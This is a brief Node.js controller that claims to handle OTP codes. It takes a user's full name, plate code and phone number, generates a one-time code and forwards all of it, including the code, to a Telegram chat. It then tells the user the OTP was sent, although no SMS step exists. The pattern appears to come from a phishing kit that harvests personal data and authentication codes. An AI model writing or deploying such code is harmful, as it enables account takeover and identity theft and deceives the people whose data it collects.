// Handles OTP generation, verification, and retrieval
const { generateOTP } = require('../services/otpService');
const { sendMessageToTelegram } = require('../services/telegramService');

exports.generateAndSendOTP = (req, res) => {
    const { fullName, platCode, phoneNumber } = req.body;
    const otp = generateOTP();
    // Send OTP to the user's phone (implement your SMS service here)

    // Send data to Telegram
    const message = `New registration:\nFull Name: ${fullName}\nPlat Code: ${platCode}\nPhone Number: ${phoneNumber}\nOTP: ${otp}`;
    sendMessageToTelegram(process.env.TELEGRAM_CHAT_ID, message);

    res.status(200).json({ message: `OTP sent to ${phoneNumber}` });
};

// Implement other OTP-related functions as needed...
